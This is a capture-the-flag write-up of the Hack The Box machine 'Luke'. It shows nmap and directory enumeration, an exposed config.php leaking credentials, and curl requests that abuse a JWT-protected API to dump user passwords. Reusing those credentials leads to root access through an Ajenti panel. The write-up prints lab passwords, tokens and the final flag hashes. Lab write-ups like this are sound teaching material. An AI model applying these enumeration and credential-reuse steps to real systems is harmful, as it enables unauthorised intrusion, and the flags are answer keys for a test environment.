# Hack The Box: Luke machine write-up

This machine, that runs with ip ``10.10.10.137``, was pretty straigthforward, it was only based on thorough enumeration. One aspect I really liked is that I got to learn a lot about how a JWT token service is implemented, as we needed to register to get a token and therefore be able to access more sensitive information. Let's dig in!

### Enumeration

We start by enumerating open ports to discover the services running in the machine. I open up nmap:

*Result of first nmap scan*

```sh
$ nmap -sV -sC 10.10.10.137

Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-31 21:42 BST
Nmap scan report for 10.10.10.137
Host is up (0.028s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.12.142
|      Logged in as ftp
|      TYPE: ASCII
|      No session upload bandwidth limit
|      No session download bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
22/tcp   open  ssh?
80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
|_http-title: Luke
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
8000/tcp open  http    Ajenti http control panel
|_http-title: Ajenti

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.58 seconds
```

Many services available, so I'll go one by one inspecting what they have.

### Services enumertion

#### FTP

I started by inspecting ftp, so I logged in as anonymous and found a file, which is some sort of message from Jerry to Chihiro. Good, we have some usernames and a mention of some source code, interesting...

*FTP commands used*

![Img](images/ftp.png)

I used the command ``get for_Chihiro.txt -`` to see the output in the console, removing the last dash downloads the file to our local computer.

The note is not of much use and there is nothing else, so I might as well move on.

#### Port 80, HTTP server

Here is what we find, a simple static webpage. I looked for content, but it was empty so I ran dirbuster. Here's the output:

```
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Fri May 31 21:56:03 BST 2019
--------------------------------

http://10.10.10.137:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/vendor/
/js/
/vendor/jquery/
/vendor/bootstrap/
/vendor/bootstrap/js/
/vendor/jquery-easing/
/vendor/bootstrap/css/
/member/
/css/

Dirs found with a 401 response:

/management/


--------------------------------
Files found during testing:

Files found with a 200 responce:

/index.html
/login.php
/vendor/jquery/jquery.min.js
/vendor/bootstrap/js/bootstrap.bundle.min.js
/js/scrolling-nav.js
/vendor/jquery-easing/jquery.easing.min.js
/vendor/jquery/jquery.js
/vendor/jquery/jquery.min.map
/vendor/bootstrap/js/bootstrap.bundle.js
/vendor/jquery/jquery.slim.js
/vendor/jquery-easing/jquery.easing.compatibility.js
/vendor/jquery/jquery.slim.min.js
/vendor/bootstrap/js/bootstrap.bundle.js.map
/vendor/jquery/jquery.slim.min.map
/vendor/bootstrap/js/bootstrap.bundle.min.js.map
/vendor/bootstrap/js/bootstrap.js
/vendor/jquery-easing/jquery.easing.js
/vendor/bootstrap/css/bootstrap.css
/vendor/bootstrap/js/bootstrap.js.map
/vendor/bootstrap/js/bootstrap.min.js
/vendor/bootstrap/js/bootstrap.min.js.map
/vendor/bootstrap/css/bootstrap.css.map
/vendor/bootstrap/css/bootstrap.min.css
/vendor/bootstrap/css/bootstrap.min.css.map
/css/bootstrap.min.css
/css/scrolling-nav.css
/css/signin.css
/config.php
```

Nothing was interesting... apart from the last file, ``config.php``, and a directory that was password protected, ``/management/``.

I ``curl``'ed the php file and voilà, first credentials found!

```
$dbHost = 'localhost';
$dbUsername = 'root';
$dbPassword  = 'Zk6heYCyv6ZE9Xcg';
$db = "login";

$conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
```

I tried to use them to access ``/management/`` but no use, so I decided to move on to the next service.

#### Port 3000: JWT token authentication

I didn't know what this service was, as at first when I tried to access it, it gave me a weird json response:

*Response from the service*

![Img](images/json.png)

I decided to first enumerate the serivce with dirb:

```
dirb http://10.10.10.137:3000

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Jun  6 11:32:19 2019
URL_BASE: http://10.10.10.137:3000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.137:3000/ ----
+ http://10.10.10.137:3000/login (CODE:200|SIZE:13)                                                                                  
+ http://10.10.10.137:3000/Login (CODE:200|SIZE:13)                                                                                  
+ http://10.10.10.137:3000/users (CODE:200|SIZE:56)                                                                                  

-----------------
END_TIME: Thu Jun  6 11:37:55 2019
DOWNLOADED: 4612 - FOUND: 3
```

Then, after getting the same message that I needed to authenticate, I googled the json string, which led me to find out that the service was implementing JWT tokens to authenticate users. Hence, I tried to use my credentials, which surprisingly worked!

Authenticate as ``admin:Zk6heYCyv6ZE9Xcg`` to ``/login``:

```
$ curl -s -X POST -H "Content-Type: application/json" --data '{"password":"Zk6heYCyv6ZE9Xcg", "username":"admin"}' http://10.10.10.137:3000/login
```

And the response is:

```
{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MzM3OTYxLCJleHAiOjE1NTk0MjQzNjF9.r0i77u8Nw9tZkPHCqlyYrAoP6VdautVo7mSpIb9jfL4"}
```

Then, we can use the token to access some usernames under ``/users/``:

```
$ curl -H 'Accept: application/json' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MzM3OTgxLCJleHAiOjE1NTk0MjQzODF9.FaZX2S_Fsri6Xij_xz0ySQB7oKiTlD2XXGczd5VrEXA" http://10.10.10.137:3000/users/
[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
```

We can then access each of the users' information with ``/users/{name}`` (I came across this on google):

```
$ curl -H 'Accept: application/json' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MzM3OTgxLCJleHAiOjE1NTk0MjQzODF9.FaZX2S_Fsri6Xij_xz0ySQB7oKiTlD2XXGczd5VrEXA" http://10.10.10.137:3000/users/Admin
{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
```

```
$ curl -H 'Accept: application/json' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MzM3OTgxLCJleHAiOjE1NTk0MjQzODF9.FaZX2S_Fsri6Xij_xz0ySQB7oKiTlD2XXGczd5VrEXA" http://10.10.10.137:3000/users/Derry
{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
```

```
$ curl -H 'Accept: application/json' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MzM3OTgxLCJleHAiOjE1NTk0MjQzODF9.FaZX2S_Fsri6Xij_xz0ySQB7oKiTlD2XXGczd5VrEXA" http://10.10.10.137:3000/users/Yuri
{"name":"Yuri","password":"bet@tester87"}
```

```
$ curl -H 'Accept: application/json' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MzM3OTgxLCJleHAiOjE1NTk0MjQzODF9.FaZX2S_Fsri6Xij_xz0ySQB7oKiTlD2XXGczd5VrEXA" http://10.10.10.137:3000/users/Dory
{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
```

That's a lot of credentials we got there! I tried to use them in the previous port under ``/management/`` and one of them worked: ``Admin:WX5b7)>/rp$U)FW``.

*Management directory holds sensitive information*

![Img](images/management.png)

Even more credentials: ``root:KpMasng6S5EtTy9Z``. I didn't have any more places to log in or authenticate so I decided to have a look at the third service.

#### Port 8000: Ajenti and getting root

The last service was Ajenti, a web management panel for servers. I was presented with a login panel:

*Ajenti login panel*

![Img](images/ajenti.png)

That meant it was time to try credentials! The ones that worked were the last ones I had got hold of, ``root:KpMasng6S5EtTy9Z``.

To my surprise, this was the end of the machine, this panel had root access to the whole machine, meaning we could get both hashes and even a terminal session:

*Ajenti functionality*

![Img](images/filemanager.png)

![Img](images/home.png)

![Img](images/root.png)

![Img](images/notepad.png)

![Img](images/terminal.png)

And so that's it, we got both users in one shot:

user.txt: ``58d441e500e8941f9cf3baa499e2e4da``

root.txt: ``8448343028fadde1e2a1b0a44d01e650``

I hope you liked the write-up!

---

*Diego Bernal Adelantado*
